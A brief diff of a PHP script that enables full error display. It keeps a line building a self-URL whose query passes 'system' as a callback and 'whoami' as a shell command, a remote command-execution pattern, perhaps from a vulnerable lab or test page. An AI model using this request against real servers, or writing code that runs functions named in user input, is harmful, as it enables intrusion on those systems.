@@ -1,4 +1,7 @@
 <?php
+    error_reporting(E_ALL);
+    ini_set("display_errors", 1);
+    
 	$linux = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?callback=system&amp;command=whoami'
 ?>
 
